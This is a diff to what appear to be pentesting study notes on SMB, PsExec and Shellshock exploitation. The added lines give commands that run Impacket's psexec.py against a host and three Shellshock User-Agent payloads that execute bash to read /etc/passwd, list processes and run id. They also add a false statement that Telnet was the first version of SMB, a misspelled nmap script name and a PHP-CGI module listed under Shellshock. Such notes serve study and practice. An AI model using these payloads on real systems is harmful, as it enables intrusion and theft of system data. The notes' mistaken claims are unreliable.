@@ -73,10 +73,17 @@ File sharing protocol to share files and peripherrals in a local network.
 
 **SAMBA**: allows windows to access linux shares and devices
 
+**Telnet**: first version of SMB
+
 - **User authentication**: username and password
 - **Share authentication**: password
 
-**PsExec**: network protocol that allows remote access of a computer with a command line interface. Authentication is made via SMB.
+**PsExec**: network protocol that allows remote access of a computer with a command line interface. (access to windows system with a command prompt) Authentication is made via SMB.
+```
+cp /usr/share/doc/python3-impacket/examples/psexec.py <path where we want to save the python file>
+chmod +x psexec.py
+python3 psexec.py user@<ip>
+```
 
 **Steps for exploitation**:
 
@@ -198,7 +205,11 @@ Apache web servers are configured to run CGI, interface to run scripts on Linux 
 1. Locate script that allows us to communicate with bash (.sh, .cgi).
 2. `nmap --script http-shellchock --script-args "http-shellshock.uri=<path to script>"`
 3. Look for exploits in github
+    - Open burpsuite and copy exploit line from internet and paste it in body user agent `() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \`
+    - `() { :; }; echo; echo; /bin/bash -c 'ps -ef'`
+    - `() { :; }; echo; echo; /bin/bash -c 'id'`
 4. Metasploit module
+    - php_cgi_arg_injection
 
 FTP
 ===
